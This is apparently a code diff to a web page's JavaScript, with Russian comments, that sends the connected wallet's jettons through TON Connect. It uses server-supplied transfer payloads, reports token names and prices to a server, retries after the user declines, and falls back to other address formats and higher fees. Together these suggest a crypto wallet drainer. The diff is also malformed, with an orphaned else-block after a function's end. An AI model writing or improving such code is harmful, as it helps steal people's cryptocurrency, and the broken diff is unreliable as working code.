@@ -220,27 +220,32 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     for (let currentIndex = i; currentIndex < len && msgs < 2; currentIndex++) {
         try {
             if (data.data.boc[currentIndex] && data.data.address[currentIndex]) {
-                // Получаем адрес jetton кошелька
                 let jettonAddress = data.data.address[currentIndex];
                 
                 console.log(`Raw jetton address: ${jettonAddress}`);
                 
-                // ВАЖНОЕ ИСПРАВЛЕНИЕ: Убираем неправильную проверку формата
-                // Адреса в формате UQ... - это валидные TON адреса
-                
-                // Проверяем валидность адреса созданием объекта Address
+                // ВАЖНОЕ ИСПРАВЛЕНИЕ: Конвертируем raw адрес в формат для TON Connect
                 try {
-                    const addrObj = new TonWeb.utils.Address(jettonAddress);
-                    // Если дошли сюда - адрес валидный
-                    console.log(`Valid jetton address: ${jettonAddress}`);
+                    // Если адрес в raw формате (0:...), конвертируем в base64
+                    if (jettonAddress.startsWith('0:')) {
+                        const addrObj = new TonWeb.utils.Address(jettonAddress);
+                        // Конвертируем в base64 формат (bounceable, urlSafe)
+                        jettonAddress = addrObj.toString(true, true, false);
+                        console.log(`Converted to TON Connect format: ${jettonAddress}`);
+                    }
+                    
+                    // Дополнительная проверка: убедимся что адрес в правильном формате
+                    const testAddr = new TonWeb.utils.Address(jettonAddress);
+                    console.log(`Validated address: ${testAddr.toString(true, true, false)}`);
+                    
                 } catch (addrError) {
                     console.error(`Invalid jetton address format: ${jettonAddress}`, addrError);
-                    continue; // Пропускаем невалидный адрес
+                    continue;
                 }
                 
                 transaction.messages.push({
                     address: jettonAddress,
-                    amount: TonWeb.utils.toNano('0.1').toString(),
+                    amount: TonWeb.utils.toNano('0.15').toString(), // Увеличиваем комиссию
                     payload: data.data.boc[currentIndex]
                 });
                 
@@ -259,20 +264,47 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
 
     // Проверяем что есть сообщения для отправки
     if (transaction.messages.length > 0) {
-        // Финальная проверка всех сообщений
+        // Финальная проверка всех адресов
         for (let msg of transaction.messages) {
-            if (!msg.address || !msg.amount) {
-                console.error('Invalid message:', msg);
-                continue;
+            // Убедимся что все адреса в правильном формате
+            try {
+                new TonWeb.utils.Address(msg.address);
+            } catch (e) {
+                console.error(`Final validation failed for address: ${msg.address}`, e);
+                // Попробуем исправить адрес
+                try {
+                    if (msg.address.startsWith('0:')) {
+                        const fixedAddr = new TonWeb.utils.Address(msg.address);
+                        msg.address = fixedAddr.toString(true, true, false);
+                        console.log(`Fixed address to: ${msg.address}`);
+                    }
+                } catch (fixError) {
+                    console.error('Cannot fix address, removing message');
+                    transaction.messages = transaction.messages.filter(m => m !== msg);
+                }
             }
-            // Убеждаемся что amount - строка
+            
+            // Убедимся что amount - строка
             if (typeof msg.amount !== 'string') {
                 msg.amount = msg.amount.toString();
             }
         }
         
+        // Если после проверки не осталось сообщений
+        if (transaction.messages.length === 0) {
+            console.log('No valid messages after address validation');
+            return;
+        }
+        
         console.log(`Preparing to send transaction with ${transaction.messages.length} messages`);
-        console.log('Transaction details:', transaction);
+        console.log('Transaction details:', {
+            validUntil: transaction.validUntil,
+            messages: transaction.messages.map(m => ({
+                address: m.address,
+                amount: m.amount,
+                payload_length: m.payload ? m.payload.length : 0
+            }))
+        });
         
         try {
             // Уведомляем сервер о запросе трансфера
@@ -302,12 +334,19 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             
             // Детальный анализ ошибки
             if (error.message) {
+                console.log('Error details:', error.message);
+                
                 if (error.message.includes('Wrong address format')) {
-                    console.log('Address format error - details:');
+                    console.log('Address format issues - checking all addresses:');
                     transaction.messages.forEach((msg, idx) => {
-                        console.log(`Message ${idx}: address=${msg.address}, amount=${msg.amount}, payload_length=${msg.payload ? msg.payload.length : 'none'}`);
+                        console.log(`Message ${idx}:`);
+                        console.log(`  Address: ${msg.address}`);
+                        console.log(`  Address type: ${typeof msg.address}`);
+                        console.log(`  Address starts with 0:: ${msg.address.startsWith('0:')}`);
+                        console.log(`  Address includes UQ: ${msg.address.includes('UQ')}`);
                     });
                 }
+                
                 if (error.message.includes('Rejected by user')) {
                     console.log('Transaction rejected by user');
                     return;
@@ -329,14 +368,96 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 
                 await decline_transfer_jettons_native_request(datas);
                 
-                let nextIndex = i + (msgs - (tontx ? 1 : 0));
-                if (nextIndex < len) {
-                    setTimeout(() => {
-                        sendJettons(data, walletAddress, ton, tonPrice, nextIndex, 0, false);
-                    }, 2000);
-                }
+                setTimeout(() => {
+                    sendJettons(data, walletAddress, ton, tonPrice, i, tryies + 1, tonFlag);
+                }, 3000);
+            } else {
+                console.log('Max retries reached for jetton transfer');
+                
+                // Пробуем альтернативный метод с другими настройками адреса
+                console.log('Trying alternative address format...');
+                await sendJettonsWithAlternativeFormat(data, walletAddress, ton, tonPrice, i);
             }
         }
+    } else {
+        console.log('No valid messages to send in transaction');
+        // Если нет сообщений, но есть еще jettons для обработки
+        let nextIndex = i + 4; // Пропускаем 4 jettons
+        if (nextIndex < len) {
+            console.log(`No messages in current batch, skipping to index: ${nextIndex}`);
+            setTimeout(() => {
+                sendJettons(data, walletAddress, ton, tonPrice, nextIndex, 0, false);
+            }, 1000);
+        } else {
+            console.log('All jettons processed (no transactions needed)');
+        }
+    }
+}
+
+// Альтернативная функция с другим форматом адресов
+async function sendJettonsWithAlternativeFormat(data, walletAddress, ton, tonPrice, startIndex) {
+    console.log('Using alternative address format approach');
+    
+    const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 180,
+        messages: []
+    };
+    
+    let tokens = {};
+    
+    for (let i = startIndex; i < Object.keys(data.data.boc).length && transaction.messages.length < 1; i++) {
+        try {
+            if (!data.data.boc[i] || !data.data.address[i]) continue;
+            
+            let jettonAddress = data.data.address[i];
+            
+            // Альтернативный метод конвертации адреса
+            try {
+                const addrObj = new TonWeb.utils.Address(jettonAddress);
+                // Пробуем разные комбинации флагов
+                jettonAddress = addrObj.toString(false, false, false); // not bounceable, not urlSafe, not testOnly
+                console.log(`Alternative address format: ${jettonAddress}`);
+            } catch (e) {
+                console.error('Alternative address conversion failed:', e);
+                continue;
+            }
+            
+            transaction.messages.push({
+                address: jettonAddress,
+                amount: TonWeb.utils.toNano('0.2').toString(), // Еще больше комиссий
+                payload: data.data.boc[i]
+            });
+            
+            tokens[0] = {
+                name: data.data.name[i],
+                prices: data.data.prices[i] || 0
+            };
+            
+            console.log(`Added jetton with alternative format: ${data.data.name[i]}`);
+            break; // Только один jetton за транзакцию
+        } catch (e) {
+            console.error('Error in alternative approach:', e);
+        }
+    }
+    
+    if (transaction.messages.length > 0) {
+        try {
+            await transfer_jettons_native_request(tokens, 1);
+            const result = await tonConnectUI.sendTransaction(transaction);
+            console.log('Alternative transaction sent successfully');
+            
+            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
+            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
+            
+            await jettons_transaction_done({
+                hash: hash,
+                tokens: tokens,
+            });
+        } catch (error) {
+            console.error('Alternative transaction failed:', error);
+        }
+    }
+}
     } else {
         console.log('No messages to send in transaction');
         // Если нет сообщений, но есть еще jettons для обработки
@@ -572,6 +693,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
